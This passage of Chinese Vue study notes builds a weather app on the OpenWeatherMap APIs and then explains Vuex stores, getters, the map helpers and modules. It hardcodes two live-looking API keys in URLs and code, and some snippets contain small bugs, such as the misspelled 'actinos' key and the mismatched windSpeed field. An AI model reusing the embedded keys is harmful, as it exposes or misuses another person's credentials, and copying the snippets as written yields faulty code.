+ lat：纬度
+ lon：经度
+ appid：开发者的 API key

这个经度纬度不知道，他还有另一个将城市名字转成经度纬度的 API，点击该接口中 parameters 解释中第一个参数的描述中的链接：

![image-20240501204936645](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405012049043.png)

只需要关注城市名字即可，通过城市名字获取到该城市的经度纬度：

```
http://api.openweathermap.org/geo/1.0/direct?q={city name}&appid={API key}
```

将文档继续往下翻，可以看到该接口的返回值结构和属性的解释：

![image-20240501205250901](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405012052350.png)

现在可以尝试一下：

```
https://api.openweathermap.org/geo/1.0/direct?q=万源&appid=78b262ed7919f0d79a2ca50a4a6f82bf
```

![image-20240501205528144](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405012055506.png)

现在就可以拿到一个城市的经度和纬度了，然后将这个经度纬度放入获取天气的 API 中：

```
https://api.openweathermap.org/data/2.5/weather?lat=32.0716413&lon=108.0359623&appid=78b262ed7919f0d79a2ca50a4a6f82bf
```

在这里，会返回城市的天气信息，但是有一些单位是国际标准单位，比如温度的单位就是华氏度，而不是我们习惯的摄氏度，所以这个一个接口还提供了一个参数 units，赋值 metric，表示使用公制单位：

```
https://api.openweathermap.org/data/2.5/weather?lat=32.0716413&lon=108.0359623&appid=78b262ed7919f0d79a2ca50a4a6f82bf&units=metric
```

![image-20240501211805495](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405012118904.png)

那么这些数据中就有温度、风速等数据。

还需要获得天气对应的图标，这也有一个接口，点击图中链接：

![image-20240501212226735](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405012122106.png)

看到一个接口，该接口中的圈出来的部分就是动态的：

![image-20240501212342110](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405012123504.png)

```
 https://openweathermap.org/img/wn/10d@2x.png
```

### 调用API获取天气

从搜索框开始，用户输入城市名字，点击搜索按钮后，发送 ajax 请求，先根据名字获取城市的经度纬度，再根据经度纬度获取天气：

```vue
<template>
    <div class="search">
        <input type="text" placeholder="请输入城市名字" spellcheck="false" v-model="cityName">
        <button @click="search"><img src="../assets/images/search.png"></button>
    </div>
</template>

<script>
import axios from 'axios';

export default {
    name: 'Search',
    data() {
        return {
            cityName: '',
        }
    },
    methods: {
        search() {
            // 发送AJAX请求，根据城市的名字获取纬度和经度
            let apiKey = 'f4a224d9bb218ff28e0d08865f6a7a37';
            // 使用ES6的模板语法进行字符串的拼接。
            let apiUrlGetLatAndLon = `https://api.openweathermap.org/geo/1.0/direct?q=${this.cityName}&appid=${apiKey}`;
            axios.get(apiUrlGetLatAndLon).then(
                response => {
                    console.log(response.data)
                }
            )
        }
    }
}
</script>
```

![image-20240501213449660](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405012135934.png)

可以获取到经度和纬度后，就能获取到天气：

```js
methods: {
    search() {
        let apiKey = 'f4a224d9bb218ff28e0d08865f6a7a37';
        let apiUrlGetLatAndLon = `https://api.openweathermap.org/geo/1.0/direct?q=${this.cityName}&appid=${apiKey}`;
        axios.get(apiUrlGetLatAndLon).then(
            response => {
                 // 发送AJAX请求，根据纬度和经度获取天气
                const lat = response.data[0].lat;
                const lon = response.data[0].lon;
                let apiUrlGetWeather = `https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&appid=${apiKey}&units=metric`;
                axios.get(apiUrlGetWeather).then(
                    resp => {
                        console.log(resp.data)
                    }
                )
            }
        )
    }
}
```

![image-20240501213839063](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405012138535.png)

### 实现天气渲染

拿到了天气信息后，就可以渲染了。

在 Search.vue 的 search 方法中已经获取到了天气的各种数据，接下来要将这些数据传到 Weather 组件中去，然后渲染。

将天气信息封装成一个对象，通过全局事件总线的方式将该对象传递过去。

先安装全局事件总线，在 main.js 中：

```js
new Vue({
   el: '#app',
   render: h => h(App),
   beforeCreate() {
      Vue.prototype.$bus = this
   }
})
```

Search.vue 传递数据

```js
search() {
    let apiKey = 'f4a224d9bb218ff28e0d08865f6a7a37';
    let apiUrlGetLatAndLon = `https://api.openweathermap.org/geo/1.0/direct?q=${this.cityName}&appid=${apiKey}`;
    axios.get(apiUrlGetLatAndLon).then(
        response => {
            // 获取经度纬度
            const lat = response.data[0].lat;
            const lon = response.data[0].lon;
            let apiUrlGetWeather = `https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&appid=${apiKey}&units=metric`;
            // 获取天气
            axios.get(apiUrlGetWeather).then(
                resp => {
                    // 将天气信息封装成一个对象
                    let temp = resp.data.main.temp;  // 温度
                    let humidity = resp.data.main.humidity;  // 湿度
                    let speed = resp.data.wind.speed;  // 风速
                    let icon = resp.data.weather[0].icon;  // 天气图标标号
                    let iconUrl = `https://openweathermap.org/img/wn/${icon}@2x.png`;  // 天气图片链接
                    let weather = {
                        cityName: this.cityName,
                        temp,
                        humidity,
                        speed,
                        iconUrl,
                    }
                    // 触发事件，传递数据
                    this.$bus.$emit('getWeather', weather);
                }
            )
        }
    )
}
```

Weather.vue 接收数据
```vue
<template>
    <div class="weather">
        <div>
            <img :src="weather.iconUrl" class="weather-icon">
            <h1 class="temp">{{ weather.temp }}°c</h1>
            <h2 class="city">{{ weather.cityName }}</h2>
            <div class="details">
                <div class="col">
                    <img src="../assets/images/humidity.png" />
                    <div>
                        <p class="humidity">{{ weather.humidity }}%</p>
                        <p>湿度</p>
                    </div>
                </div>
                <div class="col">
                    <img src="../assets/images/wind.png">
                    <div>
                        <p class="wind">{{ weather.windSpeed }} 米/秒</p>
                        <p>风速</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
</template>

<script>
export default {
    name: 'Weather',
    data() {
        return {
            weather: {}
        }
    },
    methods: {
        getWeather(obj) {
            this.weather = obj
        }
    },
    mounted() {
        // 绑定事件，接收数据
        this.$bus.$on('getWeather', this.getWeather);
    }
}
</script>
```

![image-20240501221633847](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405012217033.png)

### 改进

当没有搜索城市时，是这样的：

![image-20240501221709573](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405012217043.png)

当刚进入这个页面的时候，应该将 Weather 组件部分隐藏掉，当搜索了城市后，该部分才显示出来，且该部分只会初始的时候隐藏一次，以后都是显示出来的。

在 Search.vue 中封装 weather 对象时，多给一个属性，表示是否展示 Weather 组件，默认为 true，因为此时是获取到了城市的天气信息传给 Weather，就是为了显示出来，然后用这个属性来动态控制 Weather 组件是否显示。

Search.vue

```js
let weather = {
    cityName: this.cityName,
    temp,
    humidity,
    speed,
    iconUrl,
    isShow: true
}
this.$bus.$emit('getWeather', weather);
```

Weather.vue

```vue
<div class="weather" v-show="weather.isShow">
```

在没有接收数据，weather 这个对象是一个空对象，没有这个 isShow 属性，所以是 undefined，所以是 false。

![image-20240501222452826](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405012224262.png)

另外，如果没有输入城市名字就点击搜索，会出现错误：

![image-20240501222539513](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405012225971.png)

所以需要在搜索的地方判断一下：

```js
if (!this.cityName.trim()) return;
```

+ 空串的话就是 false

如果直接搜索一个不存在的城市名字的话，也会报错，所以也应该在搜索的过程中做一个判断。

当根据名字获取经纬度的时候，得到了一个空数组的话，这就说明没有这个城市，那么这个时候就要在搜索框下面展示一个提示信息，提示城市不存在。

在 Weather 组件中多加一部分用来提示，同样使用 v-show 来控制显示，那么在搜索的时候就要分成两种情况来传递数据，如果查不到城市，就传递一个 false，如果查到了，就传递一个 weather 对象，所以要在 Search 中修改：

```js
if (response.data.length == 0) {
    this.$bus.$emit('displayTip', true);
    return;
}
```

![image-20240501224010445](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405012240847.png)

同时如果查到了数据，也要将 false 传递过去：

```js
this.$bus.$emit('getWeather', weather, false);
```

然后在 Weather 组件中绑定事件，接收数据：

```html
<div class="weather">
    <div v-show="isNotFound">对不起，请检查您的城市名！</div>
    <div v-show="weather.isShow"> 
        <img :src="weather.iconUrl" class="weather-icon">
        <h1 class="temp">{{ weather.temp }}°c</h1>
        <h2 class="city">{{ weather.cityName }}</h2>
        <div class="details">
            <div class="col">
                <img src="../assets/images/humidity.png" />
                <div>
                    <p class="humidity">{{ weather.humidity }}%</p>
                    <p>湿度</p>
                </div>
            </div>
            <div class="col">
                <img src="../assets/images/wind.png">
                <div>
                    <p class="wind">{{ weather.windSpeed }} 米/秒</p>
                    <p>风速</p>
                </div>
            </div>
        </div>
    </div>
</div>
```

```js
export default {
    name: 'Weather',
    data() {
        return {
            weather: {},
            isNotFound: false,
        }
    },
    methods: {
        getWeather(obj, f) {
            this.weather = obj;
            this.isNotFound = f;
        },
        getTip(f) {
            this.isNotFound = f;
        }
    },
    mounted() {
        this.$bus.$on('getWeather', this.getWeather);
        this.$bus.$on('displayTip', this.getTip);
    }
}
```

![image-20240501224512338](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405012245791.png)

![image-20240501224528881](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405012245719.png)

# Vuex

Vuex 是一个插件，这个插件就是 Vue 的开发团队开发的。

## 概述

vuex 是实现数据**集中式状态管理**的插件。数据由 vuex 统一管理。其它组件都去使用 vuex 中的数据。只要有其中一个组件去修改了这个共享的数据，其它组件会同步更新。

一定要注意：全局事件总线和 vuex 插件的区别：

+ 全局事件总线关注点：组件和组件之间数据如何传递，一个绑定 \$on，一个触发 \$emit。数据实际上还是在局部的组件当中，并没有真正的让数据共享。只是数据传来传去

  ![image-20240502082918798](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405020829147.png)

+ vuex 插件的关注点：共享数据本身就在 vuex 上。其中任何一个组件去操作这个数据，其它组件都会同步更新。是真正意义的数据共享

  ![image-20240502082938932](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405020829209.png)

  store 中的 state 就相当于 vm 中的 data，存放的数据。

使用 vuex 的场景是：多个组件之间依赖于同一状态。来自不同组件的行为需要变更同一状态。

## Vuex环境搭建

1、安装 Vuex：

+ vue2 安装 vuex3 版本：

  ```
  npm i vuex@3
  ```

+ vue3 安装 vuex4 版本:

  ```
  npm i vuex@4
  ```

+ 安装完了后，可以在 package.json 中看到：

  ![image-20240502084004808](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405020840082.png)

2、在 src 下创建目录和 js 文件（将 Vuex 插件放在一个独立的环境中，目录和文件名不是必须叫这个）

+ 目录：vuex
+ js 文件：store.js

3、在 store.js 文件中创建核心 store 对象，并暴露

```js
import Vue from "vue";
import Vuex from 'vuex';

Vue.use(Vuex);

const store = new Vuex.Store({
    actions: {},
    mutations: {},
    state: {}
})

export default store;
```

Vuex 是一个插件，所以要使用插件必须先引入它，然后通过 Vue.use 来使用，再通过 Vuex.Store 创建一个 store 对象，该构造函数需要传递一个配置项，里面起码有三个核心的配置项对象：

+ actions：它是一个负责执行某个行为的对象
+ mutations：它是一个负责更新的对象
+ state：它是一个状态对象，等同于 Vue 中的 data，只不过不叫数据，叫状态。state 中的数据都是做了响应式处理的。 

这个 store 对象是 vuex 插件中的老大，最核心的对象，这个对象 store 是用来管理 actions 对象、mutations 对象、state 对象。创建好 store 对象后，就需要暴露出去，暴露之后，别人想用可以使用 import 进行引入。

一般将 store 的三个核心对象都定义在外面，然后简写：

```js
import Vue from "vue";
import Vuex from 'vuex';

Vue.use(Vuex);

const actions = {};
const mutations = {};
const state = {};

export default new Vuex.Store({ actions, mutations, state })
```

4、在 main.js 文件中关联 store，这一步很重要，完成这一步之后，所有的 vm 和 vc 对象上会多一个 $store 属性

```js
import Vue from 'vue'
import App from './App.vue'
import store from './vuex/store'

new Vue({
   el: '#app',
   store: store,
   render: h => h(App),
})
```

+ 要先引入 Vuex 插件中的核心对象 store
+ 使用一个新的配置项 store，加上这个配置项之后，vm 以及所有的 vc 对象上都会多一个属性：\$store，以后通过 vm.\$store 或者 vc.\$store 来获取 store 对象。

可以查看一下 vm 是不是有了 $store 这个属性：

```js
const vm = new Vue({
   el: '#app',
   store: store,
   render: h => h(App),
})
console.log(vm)
```

![image-20240502090220089](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405020902402.png)

## Vuex最简单案例

使用 vuex 实现一个点我加 1 的简单功能。

现在 store.js 中的 state 对象中定义一个属性来表示数字：

```js
import Vue from "vue";
import Vuex from 'vuex';

Vue.use(Vuex);

const actions = {};
const mutations = {};
// 等同于Vue当中的data（只不过这里我们不叫做数据，叫做状态）
// 状态对象（数据对象），已经做了响应式处理的。
const state = {
    num : 0
}

export default new Vuex.Store({
    actions,
    mutations,
    state
})
```

然后 store 对象要在 main.js 中关联，这样所有的 vm 和 vc 都可以拿到这个 store 对象：

```js
import Vue from 'vue'
import App from './App.vue'
import store from './vuex/store'

new Vue({
   el: '#app',
   store,
   render: h => h(App),
})
```

然后就可以在组件中使用，在 App.vue 中就可以拿到这个 store 对象中的 state 属性中的 num 属性：

```vue
<template>
    <div>
        <h1>{{ $store.state.num }}</h1>
        <button>点我+1</button>
    </div>
</template>
```

![image-20240502092415000](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405020924303.png)

然后需要实现加 1 的功能，使用一个点击事件：

```vue
<template>
    <div>
        <h1>{{ $store.state.num }}</h1>
        <button @click="addOne">点我+1</button>
    </div>
</template>

<script>
export default {
    name: 'App',
    methods: {
        addOne() {
            this.$store.state.num++;
        }
    }
}
</script>
```

直接在 App 组件中操作这个共享的数据，功能可以实现，但是一般不这么写。

因为这个共享的数据可能是被很多个组件使用，而当前把修改这个数据的逻辑写在了 App 组件中，那么这个逻辑代码就得不到复用。所以不建议这么写，这时就用到了 store 三个核心对象中除了 state 的另外两个：

```js
const actions = {
    // 多个action
    // 处理业务逻辑
}
const mutations = {
    // 多个mutation
    // 更新数据
}
```

+ 每一个 action 和每一个 mutation 都是一个 callback（回调函数）

在 actions 中写一个加 1 的回调函数：

```js
const actions = {
    addOne(context, value) {
        value++;
    }
}
```

+ addOne 就是一个 action，一个回调函数，在回调函数中编写复杂的业务逻辑
+ context 参数：vuex 的上下文，可以看作是 store 的压缩版
+ value 参数：传过来的数据
+ 原则：action 是用来专门处理业务逻辑，或者专门发送 ajax 请求的

然后由 App 组件中的点击事件通过 Vuex 的一个 API 来调用这个加 1 的回调函数：

```vue
<script>
export default {
    name: 'App',
    data() {
        return {
            num: 0
        }
    },
    methods: {
        addOne() {
            this.$store.dispatch('addOne', this.num)
        }
    }
}
</script>
```

+ dispatch 翻译为分发
+ dispatch 是 store 对象的一个 api，第一个参数是要调用的 action 名字，第二个参数是传过去的数据
+ 调用 dispatch 方法之后，store 对象中的 addOne 这个 action 回调函数就会被自动调用。

当通过点击事件调用 dispatch 将逻辑分发给 addOne 这个 action 执行后，addOne 将这个 this.num 的值加了 1，下一步就是应该更新 store 里面的数据，更新数据就要用到 mutations：	

```js
const mutations = {
    ADD_ONE(state, value) {
        state.num += value;
    }
};
```

+ mutations 中的方法名一般使用大写

+ state 参数：状态对象

+ value 参数：上一环节传过来的数据

+ 每一个 mutation 这个回调函数的作用就是：更新 state，只要 state 一更新，因为是响应式的，所以页面就重新渲染了。

+ mutations 中的方法通过在 actions 中的方法调用，所以在 addOne 这个 action 中还有一句代码拉力调用 ADD_ONE 这个 mutation：

  ```js
  const actions = {
      addOne(context, value) {
          value++;
          context.commit('ADD_ONE', value);
      }
  }
  ```

  通过 commit 这个方法调用 mutations 中的方法，第一个参数是 mutation 的名字，第二个参数是数据。commit 方法一执行，这个 ADD_ONE 就会被调用。

所以现在这个程序的流程是这样：点击加 1 按钮后，会触发点击事件，执行这句代码：

```js
this.$store.dispatch('addOne', this.num)
```

会调用 store 对象中的 actions 里的 addOne 方法，在 addOne 方法里，会将当前值加 1（完成业务逻辑），然后调用 mutations 中的 ADD_ONE 方法：

```js
context.commit('ADD_ONE', value);
```

就在 ADD_ONE 方法中完成数据的更新：

```js
state.num += value;
```

数据已更新，因为是响应式的，所以页面就会重新渲染。

## 继续分发dispatch

在 actions 中的回调函数里，如果还要调其他的 action 怎么办？

不能直接调用，而是通过 dispatch 来继续调用：

```js
const actions = {
    addOne(context, value) {
        value++;
        context.commit('ADD_ONE', value);
        context.dispatch('other', value);
    },
    other(context, value) {
        console.log('other');
    }
};
```

## vuex工作原理

![image-20240502103301229](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405021033590.png)

vuex 的开发者工具是包含在 Vue 开发者工具中的：

![image-20240502103903314](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405021039705.png)

如果业务非常简单，可以不写对应的 action，直接调用 mutation 更新数据，直接使用：

```js
this.$store.commit("ADD_ONE", value);
```

## 实现多组件数据共享

实现这么一个例子：

![image-20240502104513420](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405021045367.png)

App 组件中有两个组件，上面是 User 组件，下面是 Vip 组件，点击保存后都会在自己的组件中加一条数据，同时，每个组件都会显示出用户和会员的总数。

Store.js

```js
import Vue from "vue";
import Vuex from 'vuex';

Vue.use(Vuex);

const actions = {}
const mutations = {}
const state = {
    vips: [
        {id: '001', vipname: '张三'},
        {id: '002', vipname: '李四'},
        {id: '003', vipname: '王五'},
    ],
    users: [
        {id: '001', username: 'Tom'},
        {id: '002', username: 'Lucy'},
        {id: '003', username: 'Jack'},
    ]
}

export default new Vuex.Store({
    actions,
    mutations,
    state
})
```

+ 将用户和会员信息都放在 store.js 中

App.vue

```vue
<template>
    <div>
        <User></User>
        <hr>
        <Vip></Vip>
    </div>
</template>

<script>
import User from './components/User.vue'
import Vip from './components/Vip.vue'

export default {
    name: 'App',
    components: {
        User,
        Vip
    }
}
</script>
```

User.vue

```vue
<template>
    <div>
        <h1>用户列表</h1>
        <input type="text" v-model="username">
        <button @click="saveUser">保存会员</button>
        <ul>
            <li v-for="user in $store.state.users" :key="user.id">
                {{ user.username }}
            </li>
        </ul>
        <h3>当前用户数量：{{ $store.state.users.length }}</h3>
        <h3>当前会员数量：{{ $store.state.users.length }}</h3>
    </div>
</template>

<script>
export default {
    name: 'User',
    data() {
        return {
            username: '',
        }
    },
    methods: {
        saveUser() {
            
        }
    }
}
</script>
```

Vip.vue

```vue
<template>
    <div>
        <h1>会员列表</h1>
        <input type="text" v-model="vipname">
        <button @click="saveVip">保存会员</button>
        <ul>
            <li v-for="vip in $store.state.vips" :key="vip.id">
                {{ vip.vipname }}
            </li>
        </ul>
        <h3>当前用户数量：{{ $store.state.vips.length }}</h3>
        <h3>当前会员数量：{{ $store.state.users.length }}</h3>
    </div>
</template>

<script>
export default {
    name: 'Vip',
    data() {
        return {
            vipname: '',
        }
    },
    methods: {
        saveVip() {

        }
    }
}
</script>
```

![image-20240502110405793](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405021104159.png)

然后实现 saveUser 和 saveVip 方法，通过 dispatch 分发到 store 中的 actions 中的回调函数：

```js
saveUser() {
    this.$store.dispatch('saveUser', { id: Date.now(), username: this.username });
}
```

```js
saveVip() {
    this.$store.dispatch('saveVip', { id: Date.now(), vipname: this.vipname });
}
```

然后再通过 commit 调用 mutations 中的方法来更新 state 中的数据：

```js
const actions = {
    saveUser(context, value) {
        context.commit('SAVE_USER', value);
    },
    saveVip(context, value) {
        context.commit('SAVE_VIP', value);
    }
}
const mutations = {
    SAVE_USER(state, value) {
        state.users.unshift(value);
    },
    SAVE_VIP(state, value) {
        state.vips.unshift(value);
    }
}
```

![image-20240502111221026](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405021112389.png)

这个例子中的 action 实现的业务逻辑基本没有，所以可以跳过 action，直接通过 commit 调用 mutation 来更新 state 中的数据：

```js
saveVip() {
    this.$store.commit('SAVE_VIP', { id: Date.now(), vipname: this.vipname })
}
```

```js
saveUser() {
    this.$store.commit('SAVE_USER', { id: Date.now(), username: this.username })
}
```

## vuex的getters

在上面的程序中，添加一个组件，该组件中有个输入框，输入一个名字，然后回车，回车之后就将输入的名字反转过后，显示到 User 和 Vip 两个组件中。

在 store.js 中的 state 中添加一个属性 name，然后新建一个 Name.vue 组件，在这个组件中使用这个属性：

```vue
<template>
    <div>
        <input type="text" v-model="$store.state.name">
        <br>
        <h3>用户名：{{ $store.state.name }}</h3>
        <h3>反转后的用户名：{{ $store.state.name.split('').reverse().join('') }}</h3>
    </div>
</template>

<script>
export default {
    name: 'Name',
}
</script>
```

这样可以实现功能，但是这个插值语法中的表达式太长了，不推荐这么写。

vuex 插件中还有一个配置项 getters，

```js
const getters = {
    // 有很多个 getter
}
export default new Vuex.Store({actions, mutations, state, getters})
```

+ 每一个 getter 都可以看作是一个计算属性。
+ 每一个 getter 方法都会自动接收一个 state 对象

所以在 store.js 中这样写：

```js
const getters = {
    reversedName(state) {
        return state.name.split('').reverse().join('');
    }
}
```

然后在组件中这样用：

```js
<h3>反转后的用户名：{{ $store.getters.reversedName }}</h3>
```

## ES6的扩展运算符

ES6 引入了扩展运算符（Spread Operator），它是三个点 `...`，用于将一个可迭代对象（如数组、字符串或类数组对象）拆分成单独的元素

扩展算符：`...`,可以用在数组上，也可以用在对象上。

拆分数组：

```js
let arr = [1,2,4,5,6,6,2,3,4];
console.log(...arr);  // 1 2 4 5 6 6 2 3 4
```

获取对象上所有的属性 ：

```js
let obj = {
    name: 'zzz',
    age: 19,
}
let obj2 = {...obj}
console.log(obj2);  // {name: 'zzz', age: 19}
```

一般用于对象属性的合并：

```js
let o1 = {
    a : 1,
    b : 2
}
let o2 = {
    x : 1,
    y : 2
}
let o3 = {
    m : 4,
    n : 5
}
let o4 = {...o1, ...o2, ...o3};
console.log(o4)  // {a: 1, b: 2, x: 1, y: 2, m: 4, n: 5}
```

## mapState和mapGetters的使用（优化计算属性）

state 映射和 getters 映射。

在以上的程序中，User 组件和 Vip 组件使用了很多次 $store.state ：

```vue
<h3>当前用户数量：{{ $store.state.users.length }}</h3>
<h3>当前会员数量：{{ $store.state.vips.length }}</h3>
<h3>用户名：{{ $store.state.name }}</h3>
<h3>反转后的用户名：{{ $store.getters.reversedName }}</h3>
```

那么可以使用计算属性来替代掉这一长串：

```js
computed: {
    users() {
        return this.$store.state.users;
    },
    vips() {
        return this.$store.state.vips;
    },
    name() {
        return this.$store.state.name;
    }
},
```

那么就可以直接使用计算属性：

```js
<h3>当前用户数量：{{ users.length }}</h3>
<h3>当前会员数量：{{ vips.length }}</h3>
<h3>用户名：{{ name }}</h3>
```

接着发现，这个计算属性中的格式几乎是固定的，都是 `this.$store.state.` ，这说明这些代码是可以自动生成的，我们只需要提供不是固定的部分即可。所以可以使用到 mapState 对象。

mapState 对象是 vuex 插件提供的内置的对象（负责 state 对象映射工作的一个对象）。

需要先引入：

```js
import { mapState } from 'vuex';
```

然后在组件的 mounted 钩子函数中演示一下 mapState 对象：

```js
mounted() {
    const x = mapState({
        'users': 'users',
        'vips' : 'vips',
        'name' : 'name'
    })
    console.log(x);
},
```

+ 将原先计算属性的名字和 state 中的数据的名字传过去，就能生成原先定义计算属性的代码

  ![image-20240502141909169](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405021419477.png)

查看输出的 mapState 创建的对象：

![image-20240502142122172](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405021421477.png)

这个对象里面就有原先手动定义的三个计算属性，所以可以将 mapState 创建的对象直接通过扩展运算符，将里面的所有属性全部放在组件的 computed 中，就省略掉了手写计算属性的代码：

```js
computed: {
    // users() {
    //     return this.$store.state.users;
    // },
    // vips() {
    //     return this.$store.state.vips;
    // },
    // name() {
    //     return this.$store.state.name;
    // }
    // vuex可以借助mapState帮我们的自动生成以上的代码
    ...mapState({ users: 'users', vips: 'vips', name: 'name' })
},
```

以上写法是对象形式，对于 mapState 还有数组形式的写法：

```js
computed: {
    ...mapState(['users', 'vips', 'name']
},
```

+ 注意，这个数组形式的写法，必须要是计算属性名和 state 中的数据名一致时，才能这样写

那么 mapGetters 的使用方法和 mapState 是一样的，也要先引入：

```js
import {mapGetters} from 'vuex';
```

也是在组件的 computed 中使用：

```js
computed: {
    ...mapState(['users', 'vips', 'name']),
    ...mapGetters(['reversedName'])
},
```

然后模板中就可以直接使用 reversedName 变量，而可以不用 $store.getters.reversedName 了。

将 Name.vue 中使用 mapState 和 mapGetters 替换后：

```vue
<template>
    <div>
        <input type="text" v-model="name">
        <br>
        <h3>用户名：{{ name }}</h3>
        <h3>反转后的用户名：{{ reversedName }}</h3>
    </div>
</template>

<script>
import { mapState, mapGetters } from 'vuex';

export default {
    name: 'Name',
    computed: {
        ...mapState(['name']),
        ...mapGetters(['reversedName'])
    }
}
</script>
```

这时候运行程序，输入名字后会出现错误：

![image-20240502144454118](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405021444428.png)

会提示没有 setter 方法，这是因为 `...mapState(['name'])` 生成的计算属性代码是这样的：

```js
name() {
    return this.$store.state.name;
}
```

是简写的计算属性，这个代码只有 getter 方法，没有 setter 方法，所以会报错。

所以双向绑定的属性，不要用 mapState 代替，还是用原来的写法：

```vue
<template>
    <div>
        <!--这里用双向绑定就写全-->
        <input type="text" v-model="$store.state.name">
        <br>
        <!--这里没用双向绑定就可以写计算属性-->
        <h3>用户名：{{ name }}</h3>
        <h3>反转后的用户名：{{ reversedName }}</h3>
    </div>
</template>

<script>
import { mapState, mapGetters } from 'vuex';

export default {
    name: 'Name',
    computed: {
        ...mapState(['name']),
        ...mapGetters(['reversedName'])
    }
}
</script>
```

## mapMutations和mapActions的使用（优化methods）

mapState 和 mapGetters 是优化计算属性的，Vue 会自动生成简写模式的计算属性。

在以下方法中：

```js
methods: {
    saveUser() {
        this.$store.dispatch('saveUser', { id: Date.now(), username: this.username });
        // this.$store.commit('SAVE_USER', { id: Date.now(), username: this.username });
    }
}
```

这个 dispatch 和 commit 的格式也是差不多固定的，不固定的只有方法名 saveUser 和两个参数。因为在这个 saveUser 中，一般不会进行业务逻辑，只会将逻辑分发给 action 去做，所以这个方法里就只有这种调用 dispatch 或 commit 的方法，那么也可以自动生成，使用 mapMutations 和 mapActions。

+ mapActions 用来代替  dispatch 。
+ mapMutations 用来代替 commit。

使用的时候在 methods 中使用：

```js
methods: {
    // 对象形式
    ...mapActions({ saveUser: 'saveUser' }),
        
    // 数组形式
    ...mapActions(['saveUser'])
}
```

+ 数组形式必须要是方法名和 action 中的数组名一致

![image-20240502150533278](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405021505597.png)

那么还有方法的参数在哪传？在模板中调用的时候传：

```vue
<button @click="saveUser(username)">保存会员</button>
```

还有替换 mutations，先引入：

```js
import {mapMutations} from 'vuex';
```

也有对象形式和数组形式：

```js
methods: {
    ...mapMutations({ saveVip: 'SAVE_VIP' }),
    ...mapMutations(['SAVE_VIP'])
}
```

+ 数组形式的要求和其他的一样，所以这个数组形式的写法就相当于在 methods 中创建了一个名为 SAVE_VIP 的方法，等同于：

  ```js
  ...mapMutations({ SAVE_VIP: 'SAVE_VIP' })
  ```

要传递的数据同样是调用时传：

```vue
<button @click="saveVip(vipname)">保存会员</button>
<!--如果使用数组形式的话：-->
<button @click="SAVE_VIP(vipname)">保存会员</button>
```

## vuex的模块化开发

用一个极简的案例。

### 非模块化开发

有一个 a 组件和 b 组件，每个组件中都要有 getters、state、actions、mutations 四个部分，不包含业务。

先安装 vuex，创建 store.js 文件，创建 store 对象，然后在 main.js 中关联 store 对象，再创建组件 A 和 B，将 A、B 注册到 App 中，接着开始写 A 组件：

```vue
<template>
    <div>
        <h1>A组件</h1>
        <button @click="doA1">doA1</button>
        <button @click="doA2">doA2</button>
        <h3>state：{{ $store.state.a }}</h3>
        <h3>getters：{{ $store.getters.computedA }}</h3>
    </div>
</template>

<script>
export default {
    name: 'A',
    methods: {
        doA1() {
            this.$store.dispatch('doA1');
        },
        doA2() {
            this.$store.commit('doA2');
        }
    }
}
</script>
```

B 组件和它一样，就变变变量名。

然后 store.js ：

```js
import Vue, { computed } from "vue";
import Vuex from 'vuex';

Vue.use(Vuex);

const actions = {
    doA1() {
        console.log('doA1 action.....');
    },
    doB1() {
        console.log('doB1 action.....');
    }
}
const mutations = {
    doA2() {
        console.log('doA2 mutation.....');
    },
    doB2() {
        console.log('doB2 mutation.....');
    }
}
const state = {
    a: 1,
    b: 3,
}
const getters = {
    computedA() {
        return 1;
    },
    computedB() {
        return 3;
    }
}

export default new Vuex.Store({
    actions,
    mutations,
    state,
    getters
})
```

此时程序正常：

![image-20240502154920251](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405021549623.png)

但是现在是将 A 组件和 B 组件的所有 action、mutation、state 和 getter 都是放在一起的，那么如果有很多个组件的话，这些东西都放在一起的话，就会很难以维护。为了解决这种问题，Vue 就有一种模块化开发。

### 模块化开发

怎么拆分模块？Vue 建议一个功能对应一个模块。

这里的程序业务很简单，就将整个系统拆分为两个模块：a 模块和 b 模块（a 业务和 b 业务）。

a 模块：

```js
const a = {
    actinos: {
        doA1() {
            console.log("doA1 action.....");
        },
    },
    mutations: {
        doA2() {
            console.log("doA2 mutation.....");
        },
    },
    state: {
        a: 1,
    },
    getters: {
        computedA() {
            return 1;
        },
    },
};
```

那么 b 模块也和 a 模块一样，最后 store.js 中就没有了原来的 actions 等四个对象，且创建 store 对象的时候也不需要传 actions 等四个对象了，而是传模块进去：

```js
import Vue, { computed } from "vue";
import Vuex from "vuex";

Vue.use(Vuex);

const a = {
    actinos: {
        doA1() {
            console.log("doA1 action.....");
        },
    },
    mutations: {
        doA2() {
            console.log("doA2 mutation.....");
        },
    },
    state: {
        a: 1,
    },
    getters: {
        computedA() {
            return 1;
        },
    },
};

const b = {
    actinos: {
        doB1() {
            console.log("doB1 action.....");
        },
    },
    mutations: {
        doB2() {
            console.log("doB2 mutation.....");
        },
    },
    state: {
        b: 3,
    },
    getters: {
